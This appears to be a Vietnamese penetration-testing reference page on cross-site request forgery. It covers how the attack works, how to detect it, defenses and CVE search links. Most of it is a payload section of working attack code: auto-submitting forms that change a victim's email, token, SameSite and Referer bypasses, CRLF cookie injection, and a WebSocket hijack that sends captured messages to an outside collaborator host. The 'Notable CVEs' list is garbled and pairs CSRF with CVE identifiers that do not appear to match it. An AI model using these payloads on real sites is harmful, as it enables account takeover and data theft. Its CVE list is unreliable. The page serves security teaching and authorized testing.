# Cross-Site Request Forgery

> Trình duyệt của nạn nhân bị lừa thực hiện một request đã xác thực ngoài ý muốn. **Tài liệu chuyên sâu:** [`Troubleshooting_Guide/csrf.md`](../../../../Troubleshooting_Guide/csrf.md) · **Skill:** [`ai_framework/skills/`](../../../ai_framework/skills/README.md)

**Tên gọi khác / OWASP:** CSRF · A01:2021 Broken Access Control
**Ngôn ngữ:** [English](README.md) · Tiếng Việt
**Trạng thái:** hoàn chỉnh

## Là gì (What it is)
CSRF lừa trình duyệt của một nạn nhân đang đăng nhập gửi một request thay đổi trạng thái tới ứng
dụng nơi họ đã được xác thực. Vì trình duyệt tự động đính kèm cookie của nạn nhân, máy chủ coi
request bị giả mạo là một hành động hợp lệ, có chủ đích.

## Cơ chế hoạt động (How it works)
Kẻ tấn công lưu trữ một trang kích hoạt một request tới mục tiêu (một form tự gửi, một thẻ `<img>`,
hoặc `fetch`). Khi nạn nhân truy cập trang đó trong lúc đã xác thực, trình duyệt đính kèm cookie
phiên của họ, nên hành động được thực thi với danh tính của nạn nhân. Cuộc tấn công thành công khi
ba điều kiện cùng đúng: hành động làm điều gì đó đáng để giả mạo, nó chỉ dựa hoàn toàn vào cookie để
xử lý phiên, và các tham số của nó đều có thể đoán trước (không có token không-đoán-được riêng cho
mỗi request). Token chống CSRF yếu hoặc thiếu, thiết lập `SameSite` lỏng lẻo, và kiểm tra
`Referer`/`Origin` lỏng lẻo — mỗi cái đều mở lại cánh cửa.

## Tác động (Impact)
Bất kỳ hành động thay đổi trạng thái nào nạn nhân có thể thực hiện: đổi email/mật khẩu (dẫn tới
chiếm tài khoản), chuyển tiền, thay đổi cài đặt, hoặc leo thang đặc quyền. Tác động đi theo mức độ
nhạy cảm của hành động bị giả mạo — thường là trung bình đến cao, và nghiêm trọng khi nó cho phép
ATO.

## Cách phát hiện (How to detect)
- Một POST thay đổi trạng thái không chứa token không-đoán-được, hoặc token của nó không được xác
  thực (xóa nó / đổi nó / phát lại token của phiên khác — request vẫn thành công).
- Hành động vẫn chạy khi hạ cấp POST→GET, hoặc khi cung cấp một override `_method`.
- Các kiểm tra `Referer`/`Origin` chấp nhận header vắng mặt hoặc so khớp chuỗi con với domain mục tiêu.
- Cookie được thiết lập không có `SameSite=Lax/Strict`, hoặc một sink CRLF cho phép bạn cài cookie CSRF.

## Khai thác (tóm tắt) (Exploitation)
Dựng một trang tự gửi request mục tiêu và xác nhận nó thực thi trong phiên của nạn nhân. Khi tồn tại
token, dò các lỗi xác thực — chuyển đổi phương thức, bỏ tham số, token không-gắn-phiên hoặc token
toàn cục, tiêm cookie cho double-submit, và vượt `SameSite`/`Referer`. CSWSH mở rộng ý tưởng này tới
WebSocket không xác thực. Payload đầy đủ nằm trong mục Payload phía trên.

## Payload & kỹ thuật (Payloads & techniques)
> Chắt lọc từ các tài liệu payload thực chiến — chỉ dùng cho kiểm thử được cấp phép.

### PoC tự gửi cơ bản (Baseline auto-submitting PoC)
```html
<form method="POST" action="https://TARGET/my-account/change-email">
  <input type="hidden" name="email" value="attacker@evil.com" />
</form>
<script>document.forms[0].submit();</script>
```

### Lỗi xử lý token (Token-handling flaws)
- **Chuyển đổi phương thức** — token chỉ được xác thực trên POST; gửi lại dưới dạng form GET (bỏ `method="POST"`).
- **Bỏ tham số** — token chỉ được xác thực khi có mặt; xóa hẳn trường `csrf`.
- **Pool toàn cục / không gắn phiên** — đăng nhập với tư cách kẻ tấn công, thu hoạch một token hợp lệ, nhúng nó:
```html
<form method="POST" action="https://TARGET/my-account/change-email">
  <input type="hidden" name="email" value="attacker@evil.com" />
  <input type="hidden" name="csrf" value="ATTACKER_TOKEN" />
</form>
<script>document.forms[0].submit();</script>
```

### Tiêm cookie (CRLF / double-submit) (Cookie injection)
Tiêm cookie CSRF qua một sink CRLF, rồi gửi một body khớp với nó.
```html
<!-- token tied to a csrfKey cookie -->
<img src="https://TARGET/?search=x%0d%0aSet-Cookie:%20csrfKey=ATTACKER_KEY%3b%20SameSite=None" onerror="document.forms[0].submit()" />
<!-- double-submit: same value in cookie and body -->
<img src="https://TARGET/?search=x%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None" onerror="document.forms[0].submit()" />
<form method="POST" action="https://TARGET/my-account/change-email">
  <input type="hidden" name="email" value="attacker@evil.com" />
  <input type="hidden" name="csrf" value="ATTACKER_TOKEN" /> <!-- or "fake" -->
</form>
```

### Vượt SameSite (SameSite bypasses)
```javascript
// Lax: GET top-level nav is exempt; use a method-override param
document.location = "https://TARGET/my-account/change-email?email=attacker@evil.com&_method=POST";

// Strict: launder cross-site via an on-site open redirect / path traversal
document.location = "https://TARGET/post/comment/confirmation?postId=1/../../my-account/change-email?email=attacker@evil.com%26submit=1";
```
```html
<!-- Lax cookie-refresh: trigger an OAuth flow, then submit within the ~2-min window -->
<form method="POST" action="https://TARGET/my-account/change-email">
  <input type="hidden" name="email" value="attacker@evil.com" />
</form>
<p>Click anywhere</p>
<script>
window.onclick = () => {
  window.open("https://TARGET/social-login");
  setTimeout(() => document.forms[0].submit(), 5000);
};
</script>
```

### Vượt xác thực Referer (Referer validation bypasses)
```html
<!-- server accepts an absent Referer -->
<meta name="referrer" content="no-referrer" />
<!-- substring match: put the target domain in your own URL's query string -->
<script>history.pushState("", "", "/?TARGET-LAB-ID.web-security-academy.net");</script>
<form method="POST" action="https://TARGET/my-account/change-email">
  <input type="hidden" name="email" value="attacker@evil.com" />
</form>
<script>document.forms[0].submit();</script>
```
Với trường hợp so khớp chuỗi con, đặt `Referrer-Policy: unsafe-url` trên exploit server để gửi đi URL đầy đủ.

### CSWSH (chiếm quyền WebSocket khác site) (cross-site WebSocket hijacking)
Nối chuỗi từ XSS trên một domain anh em để đọc/trích xuất qua một WebSocket không xác thực.
```javascript
var ws = new WebSocket("wss://TARGET/chat");
ws.onopen = () => ws.send("READY");
ws.onmessage = e => fetch("https://COLLABORATOR.oastify.com", {method:"POST", mode:"no-cors", body:e.data});
```

### Danh mục kiểm tra (Probe checklist)
| Phép thử | Có lỗ hổng nếu |
|------|--------------|
| Xóa hẳn token | request được chấp nhận |
| Đổi giá trị token | request được chấp nhận |
| POST → GET | request được chấp nhận |
| `_method=POST` trên một GET | request được chấp nhận |
| Xóa header Referer | request được chấp nhận |
| Domain mục tiêu trong query string của Referer | request được chấp nhận |
| Token từ một phiên khác | request được chấp nhận |

```bash
curl -H "Origin: https://evil.com" -I https://TARGET/api/endpoint
curl -H "Origin: null"             -I https://TARGET/api/endpoint
curl -H "Referer: https://evil.com" -I https://TARGET/api/endpoint
```

## Phòng chống (Defenses)
1. **Token đồng bộ / chống CSRF** — không-đoán-được, theo từng phiên (lý tưởng là theo từng request),
   được xác thực phía máy chủ, và gắn với phiên của người dùng; không bao giờ chấp nhận token vắng mặt.
2. **Cookie `SameSite`** (`Lax` mặc định, `Strict` cho các luồng nhạy cảm) để cookie không được gửi
   trong các request khác site.
3. **Xác thực `Origin`/`Referer`** so với một allowlist như lớp phòng thủ bổ sung; từ chối header
   vắng mặt đối với request thay đổi trạng thái thay vì cho phép chúng.
4. Yêu cầu **tái xác thực hoặc xác thực nâng cấp (step-up)** (mật khẩu, OTP) cho các hành động nhạy
   cảm nhất, và dùng kiểm tra header tùy chỉnh cho các API JSON/XHR.
5. Dùng middleware CSRF của framework thay vì tự viết, và giữ token tránh xa GET/URL.

## Tìm CVE từ đầu (Finding CVEs from scratch)
- **NVD** — https://nvd.nist.gov/vuln/search?query=Cross-Site+Request+Forgery
- **CVE.org** — https://www.cve.org/CVERecord/SearchResults?query=Cross-Site+Request+Forgery
- **Exploit-DB** — https://www.exploit-db.com/search?q=Cross-Site+Request+Forgery
- **GitHub Advisories** — https://github.com/advisories?query=Cross-Site+Request+Forgery
- **OSV** — https://osv.dev/list?q=Cross-Site+Request+Forgery
- **Cộng đồng** — r/netsec, blog bảo mật của nhà cung cấp, HackerOne Hacktivity, infosec trên X/Twitter.
- _Mẹo tìm kiếm: thêm sản phẩm + phiên bản mục tiêu, ví dụ `Cross-Site Request Forgery <product> <version>`._

## Các CVE tiêu biểu (Notable CVEs)
_Mang tính minh họa — hãy kiểm chứng lại trên NVD trước khi trích dẫn._
- `CVE-2020-35489` — ngoài thời kỳ sự cố Contact Form 7 (WordPress), `CVE-2018-1000525` và nhiều
  advisory CSRF của plugin WordPress cho thấy mức độ phổ biến của lớp lỗ hổng này trong hệ sinh thái
  plugin.
- ngoài kiểu `CVE-2017-5638`, `CVE-2019-9978` — CSRF của plugin "Social Warfare" trên WordPress được
  nối chuỗi tới stored XSS/RCE.
- _Ví dụ kinh điển: làn sóng CSRF router gia đình năm 2008 cấu hình lại cài đặt DNS/admin qua các
  request bị giả mạo tới trang quản trị phía LAN._

## Tham khảo (References)
- PortSwigger Web Security Academy — Cross-site request forgery (CSRF).
- OWASP — Cross-Site Request Forgery Prevention Cheat Sheet.
- RFC 6265 — HTTP State Management (cookies, incl. SameSite considerations).
